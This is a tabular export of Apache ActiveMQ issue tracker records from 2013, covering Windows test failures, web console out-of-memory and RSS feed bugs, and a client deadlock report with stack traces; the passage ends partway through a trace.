LevelDBXARecoveryBrokerTest has multiple failures on Windows,AMQ-4385,12637617,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,18/Mar/13 19:48,18/Mar/13 19:54,14/Jul/23 05:43,18/Mar/13 19:54,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,This test has 1 failure and 10 errors which do not occur elsewhere.  (NOTE: After applying the patch there will still be 2 failures.),"Windows 2008 server, jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 19:49;kearls;AMQ-4385.patch;https://issues.apache.org/jira/secure/attachment/12574198/AMQ-4385.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318097,,,Mon Mar 18 19:54:10 UTC 2013,,,,,,,Patch Available,,,,"0|i1ivyf:",318438,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Mar/13 19:49;kearls;This may look familiar...;;;","18/Mar/13 19:54;tabish;Patch applied, thanks, you have to love Windows ;);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDBStoreRecoveryBrokerTest has multiple failures on windows,AMQ-4384,12637602,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,18/Mar/13 18:34,18/Mar/13 18:52,14/Jul/23 05:43,18/Mar/13 18:52,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,This test has multiple failures on Windows because it tries to recreate the same directory repeatedly.,"Windows 2008 Server, jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 18:36;kearls;AMQ-4834.patch;https://issues.apache.org/jira/secure/attachment/12574186/AMQ-4834.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318082,,,Mon Mar 18 18:52:48 UTC 2013,,,,,,,Patch Available,,,,"0|i1ivv3:",318423,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Mar/13 18:52;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Related Activemq Persistance link is dead,AMQ-4380,12637437,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,alanfoster,alanfoster,17/Mar/13 14:41,18/Mar/13 14:18,14/Jul/23 05:43,18/Mar/13 14:18,,,,,,,,,,,,,0,,,,,,,,,"The link to the pdf called 'FUSE Source ActiveMQ Persistence Guide' under the heading 'Other Resources' is dead on the following page http://activemq.apache.org/persistence.html

Hopefully someone has an idea about where the new link should be :)",,alanfoster,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317928,,,Mon Mar 18 14:18:41 UTC 2013,,,,,,,,,,,"0|i1iuwv:",318269,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 14:18;tabish;Updated the wikie, Fuse doco is here:
https://access.redhat.com/knowledge/docs/Fuse_MQ_Enterprise/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.transport.amqp.JMSClientTest fails on Windows,AMQ-4379,12637246,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,15/Mar/13 19:08,15/Mar/13 19:18,14/Jul/23 05:43,15/Mar/13 19:18,,,,,,,,,Test Cases,,,,0,,,,,,,,,The testTransactions case fails because of a hardcoded reference to /tmp,"Windows 2008 Server, jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Mar/13 19:09;kearls;AMQ-4379.patch;https://issues.apache.org/jira/secure/attachment/12573926/AMQ-4379.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317738,,,Fri Mar 15 19:18:09 UTC 2013,,,,,,,Patch Available,,,,"0|i1itqn:",318079,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"15/Mar/13 19:18;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bring back activemq-blueprint module and feature,AMQ-4377,12637213,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,15/Mar/13 15:42,15/Mar/13 15:45,14/Jul/23 05:43,15/Mar/13 15:45,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"Even if don't need it to run the broker, in some osgi deployments people still may want to use it.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317705,,,Fri Mar 15 15:45:22 UTC 2013,,,,,,,,,,,"0|i1itjb:",318046,,,,,,,,,,,,,,,,,,,,,"15/Mar/13 15:45;dejanb;Fixed with svn revision 1456991;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JoramJmsTest QueueBrowserTest.testSenderBrowser fails intermittently.,AMQ-4376,12637207,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,kearls,kearls,15/Mar/13 14:35,20/Jun/13 16:08,14/Jul/23 05:43,20/Jun/13 16:08,,,,,,5.9.0,,,,,,,0,,,,,,,,,"QueueBrowserTest.testSenderBrowser fails intermittently on Windows with the following error:

Failed tests:   testSenderBrowser(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest): expected:<2> but was:<0>

",Windows 7 and Windows 2008,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317699,,,Thu Jun 20 16:08:31 UTC 2013,,,,,,,,,,,"0|i1ithz:",318040,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"14/Jun/13 09:41;kearls;As of June 14, this test fails consistently on most platforms if run alone; if run as part of the entire JoramJmsTest suite it passes.  On Linux when run alone it fails intermittently.
;;;","14/Jun/13 16:09;tabish;Seems to have something to do with processing the end-of-browse message from the broker.  If you add even a slight delay before its sent on and the method pumpOutbound calls sender.drained(); then everything is happy otherwise something goes wrong and the messages don't reach the browser. ;;;","20/Jun/13 16:08;chirino;Just committed a change on trunk that should fix this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMS Client isn't throwing JMSSecuirtyException with invalid login credentials,AMQ-4373,12637039,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,14/Mar/13 15:39,14/Mar/13 15:45,14/Jul/23 05:43,14/Mar/13 15:45,5.8.0,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,Client should throw JMSSecurityException whenever Broker responds with a Security exception. ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317531,,,Thu Mar 14 15:45:06 UTC 2013,,,,,,,,,,,"0|i1isgn:",317872,,,,,,,,,,,,,,,,,,,,,"14/Mar/13 15:45;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WebConsole throw Java Heap Space when browse a queue with more than 100 elements,AMQ-4372,12637024,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,elendrim,elendrim,14/Mar/13 13:55,22/Jul/13 07:40,14/Jul/23 05:43,05/Jun/13 17:35,5.8.0,,,,,5.9.0,,,Broker,,,,7,web-console,,,,,,,,"I have a standalone installation of activemq.

When I want to browse a queue with more than 100 elements, the console throw a Java Heap Space, because he try to show all elements in the queue. 
But when I have 40 elements, the page work well, and i can browse messages.

It should be interesting to paginate this page, to only show, for example, the first 100 elements.

The page : 
http://localhost:8161/admin/browse.jsp?JMSDestination=TestQueueOne


Added : 
I have tested with the 5.7.0 version of activemq and this bug doesn't exist. 
",Linux/Ubuntu,al@starfishzone.com,byteflinger,ceposta,david.lloyd,dejanb,elendrim,gamik,jwatkins,omnibot2k,paulgale,richardfearn,smox,subathra1985,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4487,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317516,,,Mon Jul 22 07:40:41 UTC 2013,,,,,,,,,,,"0|i1isdb:",317857,,,,,,,,,,,,,,,,,,,,,"19/Apr/13 18:37;gamik;Same issue here: 
OS: ubuntu
activeMq version 5.8.0;;;","22/Apr/13 10:03;smox;I can confirm the issue:

OS: Windows 7
AMQ: 5.8.0

It occurs when I try to browse a queue using a tools such as ActiveMQBrowser which indicates that it is a general issue.;;;","26/Apr/13 09:59;subathra1985;Same issue here, does not happen on 5.7. Tested on 1.6 and 1.7 JDK.

If you click on 'active consumers' in the console when this is happening, you can see an enormous amount of enqueue and dequeues from the MQ host itself which seems to eat the box.;;;","26/Apr/13 10:14;subathra1985;A few more details on our setup;

ActiveMQ 5.8.0, Running on Java 1.6.x
Backend Storage is Multi-Master Percona 5.5.x;;;","11/May/13 01:24;david.lloyd;Appear to have the same issue here, running ActiveMQ 5.8.0 on Java 1.7.x (Windows 7) - queues stored in SQL Server 2008 R2

Have also attempted to browse the queue with alternative queue browsers, using HermesJMS to browse a queue with 92 messages queued it retrieved over 500,000 messages from the queue before I told it to stop. It appears to get stuck in a loop and repeatedly retrieve the same 92 messages (which makes more sense to me that this runs the default browser out of heap space when a handful fewer messages are no problem).

When replaying messaging into the queue from HermesJMS, even with 2000 messages in the queue the default browser loads them in under 2 seconds, we only seem to encounter this issue when the queue is populated from our application which is using the Apache NMS API.;;;","13/May/13 21:56;tabish;Have you tried to create a JUnit test case to reproduce?  ;;;","04/Jun/13 15:54;tabish;Same root cause from what I can tell.;;;","04/Jun/13 15:56;tabish;You can work around this in the latest 5.9-SNAPSHOT builds if you set the maxProducersToAudit Policy value to a high enough value to account for the number of producers in your scenario.  ;;;","05/Jun/13 17:35;tabish;Fixed on trunk.  Try the next ActiveMQ 5.9.0 SNAPSHOT for testing.;;;","27/Jun/13 12:53;subathra1985;Confirmed this solved my issue.

Are we likely to see this fix backported to a minor 5.8 release or wait for 5.9-RELEASE?;;;","27/Jun/13 15:07;ceposta;Most likely 5.9 release.;;;","28/Jun/13 11:45;subathra1985;Can I get a diff or a link to the commit so I can take a look at porting this to 5.8 stable?

It's causing us some rather bad production issues and we can't roll back to 5.7 due to another issue.

Cheers,
;;;","28/Jun/13 12:35;dejanb;Just click on the ""Source"" link and you'll get the list of commits relevant to this issue.;;;","03/Jul/13 15:27;byteflinger;I have just tried applying the patches listed on source to 5.8.0 and it seems to work. I should note that there is one patch missing from the source list. When applying the patches for the PolicyEntry.java file make sure to start with the previous revision than the first one mentioned in the source, if you apply that patch plus all the others mentioned in the source it should work.;;;","16/Jul/13 07:43;byteflinger;After some further testing I am not sure this issue is solved. I have applied the patches to 5.8.0 and it seems to make it more stable however not completely. I have managed to browse the queue using the webconsole a few times however other times it will still try to load for a while and return with the following error

java.lang.OutOfMemoryError: Java heap space
	at java.util.Arrays.copyOf(Arrays.java:2367)
	at java.io.CharArrayWriter.write(CharArrayWriter.java:105)
	at java.io.PrintWriter.write(PrintWriter.java:426)
	at com.opensymphony.module.sitemesh.filter.RoutablePrintWriter.write(RoutablePrintWriter.java:144)
	at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:181)
	at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:449)
	at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:462)
	at org.apache.jsp.browse_jsp$browse_jspHelper.invoke0(org.apache.jsp.browse_jsp:394)
	at org.apache.jsp.browse_jsp$browse_jspHelper.invoke(org.apache.jsp.browse_jsp:450)
	at org.apache.jsp.tag.web.jms.forEachMessage_tag.doTag(org.apache.jsp.tag.web.jms.forEachMessage_tag:89)
	at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:170)
	at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1329)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
	at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)
	at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137);;;","16/Jul/13 14:02;tabish;Try pulling in the fix for AMQ-4595;;;","22/Jul/13 07:40;byteflinger;Thanks Timothy

That seems to have done the trick and so far things have been stable. I'll report if any other issues occur.

I should also mention, for anybody attempting it, that as for the patches from this bug (4372), the patch for 4595 also is not directly appliable to 5.8.0 sources. You probably have to go back a few revisions however a bit of editing on the revision pertaining to the bug is enough to be able to apply it to 5.8.0 sources.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RSS and ATOM feeds doesn't work in web-console,AMQ-4371,12637021,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,elendrim,elendrim,14/Mar/13 13:47,02/Oct/13 15:55,14/Jul/23 05:43,02/Oct/13 15:55,5.8.0,,,,,5.9.0,,,,,,,0,web-console,,,,,,,,"I have a standalone activemq installation.
In the web admin console, when i want to access to RSS or ATOM Feeds, I have an error page.

The page with RSS and ATOM : http://localhost:8161/admin/queues.jsp

The RSS Page who failed with this error ( ""Page Not Found!"" ).
http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=rss_2.0

The RSS Page who failed with this error ( ""Page Not Found!"" ).
http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=atom_1.0

",Linux/Ubuntu,davsclaus,elendrim,rbalent,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Mar/13 19:04;rbalent;missingServlet.diff;https://issues.apache.org/jira/secure/attachment/12576136/missingServlet.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317513,,,Wed Oct 02 15:55:27 UTC 2013,,,,,,,,,,,"0|i1iscn:",317854,,,,,,,,,,,,,,,,,,,,,"29/Mar/13 19:04;rbalent;I see the servlet declaration in web.xml of activemq-web-console was removed month ago. I'm attaching the patch which reverts this change.

[~dejanb] Can you please look why the declaration was removed?

Thank you,
Robert;;;","02/Oct/13 15:50;davsclaus;Let me take a look;;;","02/Oct/13 15:55;davsclaus;Thanks for reporting, and Robert for the patch. Its working again now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Potential deadlock between FailoverTransport,AMQ-4370,12636844,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,silviosams,silviosams,13/Mar/13 19:44,20/Mar/13 12:01,14/Jul/23 05:43,20/Mar/13 12:01,5.5.1,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"We have a problem related a Leak and the a possible Deadlock, we know that we are using versions outdated. We are in production with this version and we need know the correct version to upgrade where the bug is fixed. Or a new bug found?

We found this bugs: Leak: AMQ-3214 - Deadlock: AMQ-4274

LEAK:

Exception in thread ""ActiveMQ Transport: tcp:///10.80.30.150:60721"" java.lang.OutOfMemoryError: getNewTla
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:211)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@1ff1bec3"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.addWaiter(AbstractQueuedSynchronizer.java:584)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
        at java.util.concurrent.ThreadPoolExecutor.workerCanExit(ThreadPoolExecutor.java:971)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:950)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""ActiveMQ Session Task-11124"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.CopyOnWriteArrayList.iterator(CopyOnWriteArrayList.java:925)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:190)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@1ff1bbd6"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.addWaiter(AbstractQueuedSynchronizer.java:584)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
        at java.util.concurrent.ThreadPoolExecutor.workerCanExit(ThreadPoolExecutor.java:971)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:950)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""ActiveMQ Session Task-11122"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.CopyOnWriteArrayList.iterator(CopyOnWriteArrayList.java:925)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:190)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""ActiveMQ Session Task-11123"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.CopyOnWriteArrayList.iterator(CopyOnWriteArrayList.java:925)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:190)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@1ff1b3e5"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.addWaiter(AbstractQueuedSynchronizer.java:584)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
        at java.util.concurrent.ThreadPoolExecutor.workerCanExit(ThreadPoolExecutor.java:971)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:950)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
        at java.lang.Thread.run(Thread.java:662)
Exception in thread ""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@1ff1bb00"" java.lang.OutOfMemoryError: getNewTla
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.addWaiter(AbstractQueuedSynchronizer.java:584)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
        at java.util.concurrent.ThreadPoolExecutor.workerCanExit(ThreadPoolExecutor.java:971)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:950)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
        at java.lang.Thread.run(Thread.java:662)




DEADLOCK:


Chain 1:
""Camel (MainframeAdapterContext) thread #3 - JmsConsumer[bam_input_temp]"" id=25 idx=0xa4 tid=6373 waiting for java/lang/Object@0x820d0a98 held by:
""Camel (MainframeAdapterContext) thread #25 - JmsConsumer[bam_input_temp]"" id=47 idx=0xfc tid=6399 waiting for java/util/concurrent/locks/ReentrantLock$NonfairSync@0x824288d8 held by:
""Camel (MainframeAdapterContext) thread #92 - JmsConsumer[bam_input_temp]"" id=114 idx=0x208 tid=6496 (waiting on notification)

""Camel (MainframeAdapterContext) thread #3 - JmsConsumer[bam_input_temp]"" id=25 idx=0xa4 tid=6373 prio=5 alive, blocked, native_blocked, daemon
    -- Blocked trying to get lock: java/lang/Object@0x820d0a98[fat lock]
    at jrockit/vm/Threads.waitForUnblockSignal()V(Native Method)
    at jrockit/vm/Locks.fatLockBlockOrSpin(Locks.java:1411)[optimized]
    at jrockit/vm/Locks.lockFat(Locks.java:1512)[optimized]
    at jrockit/vm/Locks.monitorEnterSecondStageHard(Locks.java:1054)[optimized]
    at jrockit/vm/Locks.monitorEnterSecondStage(Locks.java:1005)[optimized]
    at jrockit/vm/Locks.monitorEnter(Locks.java:2179)[optimized]
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.clearResources(DefaultMessageListenerContainer.java:1097)
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:958)
    at java/util/concurrent/ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java/util/concurrent/ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java/lang/Thread.run(Thread.java:662)
    at jrockit/vm/RNI.c2java(JJJJJ)V(Native Method)
    -- end of trace

""Camel (MainframeAdapterContext) thread #25 - JmsConsumer[bam_input_temp]"" id=47 idx=0xfc tid=6399 prio=5 alive, parked, native_blocked, daemon
    -- Parking to wait for: java/util/concurrent/locks/ReentrantLock$NonfairSync@0x824288d8
    at jrockit/vm/Locks.park0(J)V(Native Method)
    at jrockit/vm/Locks.park(Locks.java:2230)[inlined]
    at jrockit/proxy/sun/misc/Unsafe.park(Unsafe.java:616)[inlined]
    at java/util/concurrent/locks/LockSupport.park(LockSupport.java:156)[inlined]
